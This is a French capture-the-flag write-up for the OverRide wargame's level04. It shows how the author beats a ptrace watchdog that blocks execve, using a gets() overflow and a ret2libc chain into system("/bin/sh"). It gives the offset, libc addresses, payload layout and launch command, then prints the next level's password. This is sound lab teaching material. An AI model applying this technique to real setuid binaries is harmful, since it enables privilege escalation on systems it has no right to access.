Le niveau précédent nous a donné le mot de passe SSH pour `level04`, donc on peut enfin se connecter et voir ce que ce binaire a dans le ventre.  
L’objectif ici, c’est clairement annoncé par le programme lui‑même : 

```
Give me some shellcode, k
```

Sauf qu’en réalité, si on essaie de faire du shellcode classique avec un `execve("/bin/sh")`, ça se fait *instantanément* dégommer par le processus parent.  
Le vrai but du niveau, c’est de comprendre comment le parent surveille le child, et comment contourner cette surveillance avec un ret2libc propre.

## Premières observations

On trouve le binaire ici :
```bash
ls -l /home/users/level04
./level04
```

On vérifie rapidement les protections :
```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k
a
child is exiting...
```

Et côté binaire :
```bash
level04@OverRide:~$ file level04
level04: setuid setgid ELF 32-bit LSB executable, Intel 80386 ...
```

Le binaire est setuid, et quand on le lance, il :  
1. affiche le message
2. lit une ligne (sans protection)
3. puis affiche `child is exiting...`

Donc on se doute qu’il y a un `fork()` quelque part, et que c’est le child qui lit notre entrée.

Avec un désassembleur / gdb, on confirme le pattern classique :  
- le parent fait un `fork()`
- le child lit des données avec quelque chose du genre `gets(buf)` → buffer overflow possible
- le parent utilise `ptrace()` pour inspecter l’état du child

En gros :  
le child est vulnérable, mais le parent le surveille.

<br>

## Comprendre le mécanisme de surveillance

Dans le code du parent, on tombe sur une boucle du style (en pseudo‑C) :
```c
do {
    wait(&status);
    if ((status & 0x7F) == 0 || (((status & 0x7F) + 1) >> 1) > 0) {
        puts("child is exiting...");
        return 0;
    }
    eax = ptrace(PTRACE_PEEKUSER, child_pid, 44, 0);
} while (eax != 11);

puts("no exec() for you");
kill(child_pid, 9);
```

En gros :

- le parent attend que le child s’arrête (signal, trap, etc.)
- il vérifie son état, et tant qu’il ne s’est pas vraiment terminé, il continue
- à chaque tour, il lit le registre **EAX** du child via `ptrace(PTRACE_PEEKUSER, ...)`
- tant que EAX != 11, il reboucle
- dès qu’il voit **EAX == 11**, il affiche `no exec() for you` et tue le child

Pourquoi 11 ?  
Parce qu’en 32 bits Linux, 11 c’est le numéro de syscall de `execve`.  
Donc dès que notre shellcode tente un `int 0x80` avec `eax = 11`, le parent le voit et killswitch direct.

Conclusion :  
un shellcode classique basé sur `execve` est impossible ici. Le parent est littéralement un anti‑shellcode (c'etait trop beau pour être vrai)

<br>

## Stratégie générale

Comme on ne peut pas faire de syscall `execve` dans le child, il faut changer complètement de plan.  

L’idée :  
- ne pas exécuter de syscall nous‑mêmes
- mais rediriger l’exécution vers une fonction de la libc, déjà présente en mémoire
- typiquement `system("/bin/sh")`

`system()` se charge de lancer `/bin/sh` pour nous. Le parent regarde juste EAX pour détecter `execve`, pas l’appel de `system()` lui-même.

C’est exactement un scénario de **ret2libc** :  
- overflow du buffer
- écrasement de EIP (= “Instruction Pointer”, l’adresse de retour)
- retour vers `system()`
- avec en argument l’adresse de la chaîne `"/bin/sh"` déjà présente dans la libc
- en mettant une adresse de retour “propre”, par exemple `exit()` pour terminer ensuite

<br>

## Analyse de la vulnérabilité côté child

Côté child, le code ressemble à :
```c
char buf[128];

puts("Give me some shellcode, k");
gets(buf);
```

`gets()` lit jusqu’à ce qu’il rencontre un `\n`, sans aucune limite de taille.  
Donc si on envoie plus de 128 caractères, on déborde sur :  
- l’ancienne valeur de EBP (= base pointer, en gros le pointeur de stack de la fonction appelante)
- puis EIP

Résultat : on peut contrôler l’adresse de retour du child.

Ce qu’on veut, concrètement :  
- remplir le buffer avec du padding
- écraser EIP par l’adresse de `system`
- placer derrière une fausse adresse de retour (par ex `exit`)
- puis l’adresse de la chaîne `"/bin/sh"` dans la libc

La stack au moment du `ret` devra ressembler à :
```
EIP  = system
[esp]   = adresse de retour (exit)
[esp+4] = adresse de la chaine "/bin/sh"
```

<br>

## Localiser les adresses utiles

Tout ça se fait dans gdb sur la VM OverRide, une fois le binaire lancé.

### Adresse de system()

Dans gdb :
```gdb
(gdb) info function system
0xf7e6aed0  system
```
> On note : `SYSTEM = 0xf7e6aed0`.

---

### Adresse de exit()

```gdb
(gdb) info function exit
0xf7e5eb70  exit
```
> On note : `EXIT = 0xf7e5eb70`.   
Ce n’est pas obligatoire d’utiliser `exit`, mais c’est propre si jamais `system()` retourne.

---

### Adresse de "/bin/sh" dans la libc

On liste les mappings mémoire du process :
```gdb
(gdb) info proc mapping
0xf7e2c000 0xf7fd0000   ...   /lib32/libc-2.15.so
```

On cherche la chaîne directement dans la zone libc :
```gdb
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
```
> On note : `BINSH = 0xf7f897ec`.

Ces valeurs dépendent de l’environnement, mais sur la VM OverRide elles sont stables car pas de PIE et l’ASLR est désactivé.

---

<br>

## Trouver l’offset pour écraser EIP

L’idée, c’est de savoir au bout de combien d’octets envoyés via `gets()` on commence à écraser EIP.

(Je me suis bien pris la tête a trouver ca, mais au final jai trouvé 156 octets)  
- envoyer des buffers de tailles croissantes (128, 140, 150, 156, 160, etc.)  
- regarder dans gdb à partir de quelle taille EIP change  
- et affiner pour trouver la taille exacte  
  
Bref, on s’en tient à `156`.

<br>

## Construction du payload en Python

On va générer le payload avec un petit script Python en utilisant uniquement la lib standard (comme demandé sur la VM).

Structure du payload :  
- 156 octets de padding (`"A" * 156`)  
- 4 octets : adresse de `system()` en little endian  
- 4 octets : adresse de `exit()` en little endian (adresse de retour depuis system)  
- 4 octets : adresse de la chaîne `"/bin/sh"` en little endian  

En Python, ça donne [ca](./exploit.py)  

On sauvegarde ça dans `/tmp/04.py` sur la VM, tu peux vérifier que le script fonctionne avec :
```bash
python /tmp/04.py | hexdump -C | head
```
> Si tu vois un dump hex propre et pas de `SyntaxError`, c’est bon.

<br>

## Lancement de l’exploit

Maintenant, on enchaîne :
```bash
(python /tmp/04.py; cat) | ./level04
Give me some shellcode, k
```

Explication de la commande :  
- `python /tmp/04.py` génère le payload binaire sur stdout  
- le `; cat` derrière garde stdin ouvert après l’envoi du payload (au cas où le programme lirait plus)  
- tout ça dans un pipe dans `./level04`, donc le child lit notre payload via `gets()`  

Si tout se passe bien, au lieu de :
```bash
child is exiting...
```

on doit se retrouver avec un shell. Plus qu'a faire le tour :
```bash
$ whoami
level05
cd /home/users/level05
ls -la
cat .pass
# resultat
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
